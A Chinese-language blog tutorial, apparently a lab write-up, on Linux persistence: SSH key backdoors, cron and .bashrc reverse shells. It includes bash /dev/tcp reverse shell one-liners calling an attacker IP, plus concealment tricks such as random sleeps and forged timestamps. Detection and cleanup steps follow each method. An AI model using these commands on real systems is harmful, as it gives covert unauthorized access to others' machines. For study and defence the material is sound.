@@ -1,0 +1,1502 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.3.1/css/all.min.css" integrity="sha256-4Lad8m4ZWW1Lgb9+sMVLYEfnIh7BjV1NQMEe79Pviks=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"etreamour.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.29.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="本文记录权限维持基础原理以及防护的实验步骤。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="权限维持">
+<meta property="og:url" content="https://etreamour.github.io/2026/10/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/index.html">
+<meta property="og:site_name" content="欢迎访问我的博客">
+<meta property="og:description" content="本文记录权限维持基础原理以及防护的实验步骤。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-10-21T01:10:40.000Z">
+<meta property="article:modified_time" content="2026-10-21T01:50:48.133Z">
+<meta property="article:author" content="Xzt">
+<meta property="article:tag" content="web安全">
+<meta property="article:tag" content="权限维持">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://etreamour.github.io/2026/10/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://etreamour.github.io/2026/10/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/","path":"2026/10/21/权限维持/","title":"权限维持"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>权限维持 | 欢迎访问我的博客</title>
+  
+
+
+
+
+
+
+
+
+  
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-search popup-trigger" aria-label="搜索" role="button">
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">欢迎访问我的博客</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">学习记录，分享知识</p>
+  </div>
+
+  <div class="site-nav-toggle" aria-label="切换导航栏" role="button">
+      <i class="fa fa-ellipsis fa-fw fa-lg"></i>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">12</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-layer-group fa-fw"></i>分类<span class="badge">6</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">11</span></a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Xzt</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://etreamour.github.io/2026/10/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Xzt">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="欢迎访问我的博客">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="权限维持 | 欢迎访问我的博客">
+      <meta itemprop="description" content="本文记录权限维持基础原理以及防护的实验步骤。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          权限维持
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-10-21 09:10:40 / 修改时间：09:50:48" itemprop="dateCreated datePublished" datetime="2026-10-21T09:10:40+08:00">2026-10-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞笔记</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">本文记录权限维持基础原理以及防护的实验步骤。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>权限维持的定义</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">权限维持（Persistence）是攻击者在目标系统中建立持久访问通道的技术手段。</span><br><span class="line">在渗透测试或真实攻防场景中，通过漏洞利用获得的初始访问权限具有临时性。目标系统重启、管理员修复漏洞或网络连接中断，均会导致该通道失效。权限维持的核心目标在于：在目标系统中预先植入一个或多个备用访问入口，确保即使主通道失效，攻击者仍能重新进入系统。</span><br></pre></td></tr></table></figure>
+
+<p>权限维持的三个核心价值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.持久性：初始Shell为临时会话，网络波动或系统重启会导致断连，后门提供了稳定的重连能力。</span><br><span class="line">2.隐蔽性：APT攻击通常持续数月甚至数年，需要一个不易被发现的长期通道。</span><br><span class="line">3.容错性：管理员可能修复初始入侵所利用的漏洞，但只要后门存在，攻击者仍可绕过修复重新进入。</span><br></pre></td></tr></table></figure>
+
+<p>访问维持与特权保留的区分</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>核心目标</th>
+<th>典型技术</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>访问维持</td>
+<td>失去连接后能够重新连回</td>
+<td>SSH公钥、Cron任务、Shell配置、Systemd服务</td>
+</tr>
+<tr>
+<td>特权保留</td>
+<td>重连后快速从普通用户提升至 root</td>
+<td>SUID程序、Capabilities、UID&#x3D;0 账户</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUID在提权实验与权限维持实验中的角色不同：提权场景中它是获取root权限的手段；权限维持场景中它是&quot;获得普通用户权限后，预留一个随时可用的root通道&quot;。</span><br></pre></td></tr></table></figure>
+
+<p>Linux权限模型</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UID（Real User ID）：进程的实际所有者</span><br><span class="line">EUID（Effective User ID）：系统进行权限检查时使用的身份</span><br><span class="line"></span><br><span class="line">当可执行文件设置了SUID位时，进程启动时EUID被设置为文件所有者的UID，UID仍为执行者的UID。</span><br></pre></td></tr></table></figure>
+
+<p>文件权限的强制性检查</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SSH服务端默认启用StrictModes选项，在认证前检查文件权限：</span><br><span class="line">	ssh目录若为755，其他用户可查看授权公钥列表→拒绝登录。</span><br><span class="line">	authorized_keys若为644，其他用户可修改授权列表→拒绝登录。</span><br></pre></td></tr></table></figure>
+
+<p>Linux系统攻击面</p>
+<table>
+<thead>
+<tr>
+<th>层次</th>
+<th>组件</th>
+<th>后门形式</th>
+<th>实现难度</th>
+<th>检测难度</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>固件层</td>
+<td>BIOS&#x2F;UEFI</td>
+<td>固件级Rootkit</td>
+<td>极高</td>
+<td>极高</td>
+</tr>
+<tr>
+<td>引导层</td>
+<td>GRUB&#x2F;Bootloader</td>
+<td>引导程序篡改</td>
+<td>高</td>
+<td>高</td>
+</tr>
+<tr>
+<td>内核层</td>
+<td>Linux Kernel</td>
+<td>内核模块Rootkit</td>
+<td>极高</td>
+<td>极高</td>
+</tr>
+<tr>
+<td>服务层</td>
+<td>Systemd&#x2F;Init</td>
+<td>恶意服务单元</td>
+<td>中等</td>
+<td>中等</td>
+</tr>
+<tr>
+<td>用户层</td>
+<td>Cron&#x2F;Shell&#x2F;SSH</td>
+<td>定时任务、配置文件后门</td>
+<td>低</td>
+<td>低</td>
+</tr>
+</tbody></table>
+<p>后门技术分级</p>
+<table>
+<thead>
+<tr>
+<th>级别</th>
+<th>典型技术</th>
+<th>权限要求</th>
+<th>隐蔽性</th>
+<th>清除难度</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>用户级</td>
+<td>SSH密钥、Cron 任务、Shell配置</td>
+<td>普通用户</td>
+<td>低</td>
+<td>低</td>
+</tr>
+<tr>
+<td>系统级</td>
+<td>Systemd服务、SUID程序、PAM 模块</td>
+<td>Root</td>
+<td>中</td>
+<td>中</td>
+</tr>
+<tr>
+<td>内核级</td>
+<td>LKM Rootkit、eBPF后门</td>
+<td>Root</td>
+<td>高</td>
+<td>高</td>
+</tr>
+</tbody></table>
+<p>访问维持方法：</p>
+<p>一、SSH公钥植入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">核心目标：将攻击者公钥写入目标用户的authorized_keys，实现免密持久登录。</span><br><span class="line">原理：SS支持密码认证与公钥认证。公钥认证基于非对称加密：公钥公开分发，私钥严格保密，authorized_keys存储被授权的公钥列表。</span><br><span class="line">认证流程：</span><br><span class="line">	1.客户端向服务端发送公钥指纹。</span><br><span class="line">	2.服务端检查该公钥是否在authorized_keys中。</span><br><span class="line">	3.若存在，服务端用公钥加密随机数发送给客户端。</span><br><span class="line">	4.客户端用私钥解密返回，服务端验证通过后允许登录。</span><br></pre></td></tr></table></figure>
+
+<p>步骤一：生成密钥对（Kali）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096 -f ~/.ssh/backdoor_key -N &quot;&quot;</span><br><span class="line">cat ~/.ssh/backdoor_key.pub</span><br></pre></td></tr></table></figure>
+
+<p>ssh-keygen参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-t rsa</code></td>
+<td>指定密钥算法为 RSA</td>
+</tr>
+<tr>
+<td><code>-b 4096</code></td>
+<td>密钥长度 4096 位，高于默认 2048，更安全</td>
+</tr>
+<tr>
+<td><code>-f ~/.ssh/backdoor_key</code></td>
+<td>私钥输出路径，公钥自动命名为 <code>backdoor_key.pub</code></td>
+</tr>
+<tr>
+<td><code>-N &quot;&quot;</code></td>
+<td>私钥密码短语为空，便于自动化使用</td>
+</tr>
+</tbody></table>
+<p>cat参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>~/.ssh/backdoor_key.pub</code></td>
+<td>读取公钥文件内容并输出到终端</td>
+</tr>
+</tbody></table>
+<p>步骤二：植入公钥（WebSrv）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p ~/.ssh</span><br><span class="line">	~/.ssh用户家目录下的.ssh目录</span><br><span class="line">chmod 700 ~/.ssh</span><br></pre></td></tr></table></figure>
+
+<p>mkdir参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-p</code></td>
+<td>递归创建目录，若已存在不报错</td>
+</tr>
+<tr>
+<td><code>~/.ssh</code></td>
+<td>用户家目录下的 <code>.ssh</code> 目录</td>
+</tr>
+</tbody></table>
+<p>chmod参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>700</code></td>
+<td>属主可读写执行，组和其他用户无权限</td>
+</tr>
+<tr>
+<td><code>600</code></td>
+<td>属主可读写，组和其他用户无权限</td>
+</tr>
+<tr>
+<td><code>~/.ssh</code></td>
+<td>目标目录</td>
+</tr>
+<tr>
+<td><code>~/.ssh/authorized_keys</code></td>
+<td>目标文件</td>
+</tr>
+</tbody></table>
+<p>echo参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&quot;ssh-rsa AAAAB3Nz... kali@kali&quot;</code></td>
+<td>要写入的公钥内容</td>
+</tr>
+<tr>
+<td><code>&gt;&gt;</code></td>
+<td>追加重定向，将内容追加到文件末尾</td>
+</tr>
+</tbody></table>
+<p>步骤三：验证（Kali）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i ~/.ssh/backdoor_key yxwa@10.10.1.81</span><br></pre></td></tr></table></figure>
+
+<p>ssh参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-i ~/.ssh/backdoor_key</code></td>
+<td>指定私钥文件路径</td>
+</tr>
+<tr>
+<td><code>yxwa@10.10.1.81</code></td>
+<td>以 yxwa 用户登录 10.10.1.81</td>
+</tr>
+</tbody></table>
+<p>常见问题</p>
+<table>
+<thead>
+<tr>
+<th>问题</th>
+<th>原因</th>
+<th>解决</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>仍要求密码</td>
+<td><code>.ssh</code> 权限不是 700</td>
+<td><code>chmod 700 ~/.ssh</code></td>
+</tr>
+<tr>
+<td>仍要求密码</td>
+<td><code>authorized_keys</code> 权限不是 600</td>
+<td><code>chmod 600 ~/.ssh/authorized_keys</code></td>
+</tr>
+<tr>
+<td>仍要求密码</td>
+<td>公钥粘贴被换行截断</td>
+<td>确认公钥为单行完整字符串</td>
+</tr>
+<tr>
+<td>仍要求密码</td>
+<td>sshd 禁用了公钥认证</td>
+<td>检查 <code>/etc/ssh/sshd_config</code></td>
+</tr>
+</tbody></table>
+<p>隐蔽性技巧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch -t 202301010000 ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p>touch参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-t 202301010000</code></td>
+<td>设置文件时间戳为 2023-01-01 00:00</td>
+</tr>
+<tr>
+<td><code>~/.ssh/authorized_keys</code></td>
+<td>目标文件</td>
+</tr>
+</tbody></table>
+<p>检测与清理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">检测：</span><br><span class="line">cat ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>~/.ssh/authorized_keys</code></td>
+<td>读取授权公钥列表</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看认证日志：journalctl -u ssh -g &quot;Accepted publickey&quot; --no-pager -n 20</span><br></pre></td></tr></table></figure>
+
+<p>journalctl参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-u ssh</code></td>
+<td>只显示 ssh 服务的日志</td>
+</tr>
+<tr>
+<td><code>-g &quot;Accepted publickey&quot;</code></td>
+<td>按内容过滤，显示包含该字符串的日志</td>
+</tr>
+<tr>
+<td><code>--no-pager</code></td>
+<td>不使用分页器，直接输出全部内容</td>
+</tr>
+<tr>
+<td><code>-n 20</code></td>
+<td>只显示最近 20 条</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">清除：vim ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>~/.ssh/authorized_keys</code></td>
+<td>编辑该文件，删除可疑公钥行</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">验证：ssh -i ~/.ssh/backdoor_key yxwa@10.10.1.81</span><br></pre></td></tr></table></figure>
+
+<p>二、Cron定时任务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">核心目标：利用 Linux 定时任务机制，实现周期性自动执行反弹命令。</span><br><span class="line"></span><br><span class="line">Cron 表达式：</span><br><span class="line">┌──── 分钟 (0-59)</span><br><span class="line">│ ┌── 小时 (0-23)</span><br><span class="line">│ │ ┌ 日期 (1-31)</span><br><span class="line">│ │ │ ┌ 月份 (1-12)</span><br><span class="line">│ │ │ │ ┌ 星期 (0-7)</span><br><span class="line">│ │ │ │ │</span><br><span class="line">* * * * * 命令</span><br></pre></td></tr></table></figure>
+
+<p>Cron 环境与交互式 Shell 的差异：</p>
+<table>
+<thead>
+<tr>
+<th>项</th>
+<th>交互式 Shell</th>
+<th>Cron 环境</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>PATH</td>
+<td>包含多个路径</td>
+<td>仅 &#x2F;usr&#x2F;bin:&#x2F;bin</td>
+</tr>
+<tr>
+<td>环境变量</td>
+<td>HOME、USER、LANG 等</td>
+<td>极简</td>
+</tr>
+<tr>
+<td>TTY</td>
+<td>有</td>
+<td>无</td>
+</tr>
+</tbody></table>
+<p>步骤一：植入定时任务（WebSrv）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(crontab -l 2&gt;/dev/null; echo &#x27;* * * * * /bin/bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.1.79/4444 0&gt;&amp;1&quot;&#x27;) | crontab -</span><br><span class="line">crontab -l</span><br></pre></td></tr></table></figure>
+
+<p>crontab参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-l</code></td>
+<td>列出当前用户的 cron 任务</td>
+</tr>
+<tr>
+<td><code>-</code></td>
+<td>从标准输入读取内容并替换当前 crontab</td>
+</tr>
+<tr>
+<td><code>2&gt;/dev/null</code></td>
+<td>屏蔽错误输出（无任务时不报错）</td>
+</tr>
+</tbody></table>
+<p>echo参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&#39;* * * * * /bin/bash -c &quot;...&quot;&#39;</code></td>
+<td>要写入的 cron 表达式与命令</td>
+</tr>
+</tbody></table>
+<p>cron表达式字段说明</p>
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>含义</th>
+<th>取值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>第 1 位</td>
+<td>分钟</td>
+<td><code>*</code> 表示每分钟</td>
+</tr>
+<tr>
+<td>第 2 位</td>
+<td>小时</td>
+<td><code>*</code> 表示每小时</td>
+</tr>
+<tr>
+<td>第 3 位</td>
+<td>日</td>
+<td><code>*</code> 表示每天</td>
+</tr>
+<tr>
+<td>第 4 位</td>
+<td>月</td>
+<td><code>*</code> 表示每月</td>
+</tr>
+<tr>
+<td>第 5 位</td>
+<td>星期</td>
+<td><code>*</code> 表示每周</td>
+</tr>
+</tbody></table>
+<p>步骤二：监听（Kali）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure>
+
+<p>nc参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-l</code></td>
+<td>监听模式</td>
+</tr>
+<tr>
+<td><code>-v</code></td>
+<td>显示详细输出</td>
+</tr>
+<tr>
+<td><code>-n</code></td>
+<td>不进行 DNS 解析，直接使用 IP</td>
+</tr>
+<tr>
+<td><code>-p 4444</code></td>
+<td>指定监听端口 4444</td>
+</tr>
+</tbody></table>
+<p>故障排查</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * /bin/bash -c &quot;echo &#x27;executed&#x27; &gt;&gt; /tmp/cron_test.log&quot;</span><br></pre></td></tr></table></figure>
+
+<p>隐蔽性技巧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 * * * * sleep $((RANDOM % 300)); bash -i &gt;&amp; /dev/tcp/10.10.1.79/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>0 * * * *</code></td>
+<td>每小时整点执行</td>
+</tr>
+<tr>
+<td><code>$((RANDOM % 300))</code></td>
+<td>生成 0-299 之间的随机数</td>
+</tr>
+<tr>
+<td><code>sleep</code></td>
+<td>延迟该随机秒数后再执行反弹</td>
+</tr>
+</tbody></table>
+<p>检测与清除</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">检测：</span><br><span class="line">crontab -l</span><br><span class="line">crontab -u &lt;用户名&gt; -l</span><br><span class="line"></span><br><span class="line">cat /etc/crontab</span><br><span class="line">ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/</span><br></pre></td></tr></table></figure>
+
+<p>参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>crontab -l</code></td>
+<td>列出当前用户任务</td>
+</tr>
+<tr>
+<td><code>crontab -u &lt;用户名&gt; -l</code></td>
+<td>列出指定用户任务（需 root）</td>
+</tr>
+<tr>
+<td><code>cat /etc/crontab</code></td>
+<td>查看系统级 crontab</td>
+</tr>
+<tr>
+<td><code>ls -la /etc/cron.d/</code></td>
+<td>列出系统级 cron 目录，<code>-l</code> 显示详细信息，<code>-a</code> 显示隐藏文件</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看 Cron 日志：journalctl -u cron --no-pager -n 20</span><br><span class="line">清除：</span><br><span class="line">crontab -r</span><br><span class="line">crontab -e</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>crontab -r</code></td>
+<td>删除当前用户的全部 cron 任务</td>
+</tr>
+<tr>
+<td><code>crontab -e</code></td>
+<td>编辑当前用户的 cron 任务</td>
+</tr>
+</tbody></table>
+<p>三、Shell配置文件后门</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">核心目标：利用 Shell 初始化机制，在用户启动终端时自动执行恶意代码。</span><br><span class="line">原理：</span><br><span class="line">	登录 Shell 加载顺序：</span><br><span class="line">	1. /etc/profile              ← 系统级</span><br><span class="line">	2. ~/.bash_profile（或 ~/.bash_login 或 ~/.profile）← 用户级</span><br><span class="line">	3. ~/.bashrc                 ← 通常被上述文件 source</span><br><span class="line">	</span><br><span class="line">	非登录 Shell：直接加载 `~/.bashrc`。</span><br></pre></td></tr></table></figure>
+
+<p>步骤一：植入后门（WebSrv）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;bash -i &gt;&amp; /dev/tcp/10.10.1.79/4445 0&gt;&amp;1 &amp;&#x27; &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure>
+
+<p>参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>echo &#39;...&#39;</code></td>
+<td>输出指定字符串</td>
+</tr>
+<tr>
+<td><code>&gt;&gt;</code></td>
+<td>追加重定向</td>
+</tr>
+<tr>
+<td><code>~/.bashrc</code></td>
+<td>目标文件</td>
+</tr>
+<tr>
